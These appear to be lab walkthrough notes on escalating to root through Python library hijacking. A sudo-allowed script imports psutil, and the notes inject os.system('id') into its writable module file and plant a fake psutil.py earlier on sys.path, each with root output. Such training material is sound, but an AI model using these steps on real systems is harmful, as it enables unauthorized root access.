# Python Library Hijacking

## Sudoers

```sh
htb-student@ubuntu:~$ sudo -l
```

```output title="Output" hl_lines="5"
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

## SUID Script

```sh
htb-student@ubuntu:~$ ls -l mem_status.py
```

```output title="Output"
-rwsrwxr-x 1 root mrb3n 192 May 19  2023 mem_status.py
```

## Contents

```sh
htb-student@ubuntu:~$ cat mem_status.py
```

```python title="Output" hl_lines="4"
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

## Wrong Write

### Module Permissions

```sh
htb-student@ubuntu:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```output title="Output"
-rw-r--rw- 1 root staff 87657 Jun  8  2023 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

### Module Hijacking

```python title="__init__.py" linenums="1920" hl_lines="53-54"
def virtual_memory():
    """Return statistics about system memory usage as a namedtuple
    including the following fields, expressed in bytes:

     - total:
       total physical memory available.

     - available:
       the memory that can be given instantly to processes without the
       system going into swap.
       This is calculated by summing different memory values depending
       on the platform and it is supposed to be used to monitor actual
       memory usage in a cross platform fashion.

     - percent:
       the percentage usage calculated as (total - available) / total * 100

     - used:
        memory used, calculated differently depending on the platform and
        designed for informational purposes only:
        macOS: active + wired
        BSD: active + wired + cached
        Linux: total - free

     - free:
       memory not being used at all (zeroed) that is readily available;
       note that this doesn't reflect the actual memory available
       (use 'available' instead)

    Platform-specific fields:

     - active (UNIX):
       memory currently in use or very recently used, and so it is in RAM.

     - inactive (UNIX):
       memory that is marked as not used.

     - buffers (BSD, Linux):
       cache for things like file system metadata.

     - cached (BSD, macOS):
       cache for various things.

     - wired (macOS, BSD):
       memory that is marked to always stay in RAM. It is never moved to disk.

     - shared (BSD):
       memory that may be simultaneously accessed by multiple processes.

    The sum of 'used' and 'available' does not necessarily equal total.
    On Windows 'available' and 'free' are the same.
    """
    import os
    os.system("id")
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
```

### Abusing

```sh
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

```output title="Output"
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 88.79%
```

## Library Path

### Import Order

```sh
htb-student@ubuntu:~$ python3 -c 'import sys; print("\n".join(sys.path))'
```

```output title="Output" hl_lines="2 4"
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

### Package Location

```sh
htb-student@ubuntu:~$ pip3 show psutil
```

```output title="Output" hl_lines="8"
Name: psutil
Version: 5.9.5
Summary: Cross-platform lib for process and system monitoring in Python.
Home-page: https://github.com/giampaolo/psutil
Author: Giampaolo Rodola
Author-email: g.rodola@gmail.com
License: BSD-3-Clause
Location: /usr/local/lib/python3.8/dist-packages
Requires:
Required-by:
```

### Writable Directory

```sh
htb-student@ubuntu:~$ ls -ld /usr/lib/python3.8
```

```output title="Output"
drwxr-xrwx 30 root root 20480 Jun  5  2023 /usr/lib/python3.8
```

### Custom Module

```python title="/tmp/psutil.py" linenums="1"
import os

def virtual_memory():
    os.system("id")
```

### Copying to Directory

```sh
htb-student@ubuntu:~$ cp /tmp/psutil.py /usr/lib/python3.8
```

### Exploitation

```sh
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

```output title="Output" hl_lines="1"
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "/home/htb-student/mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```
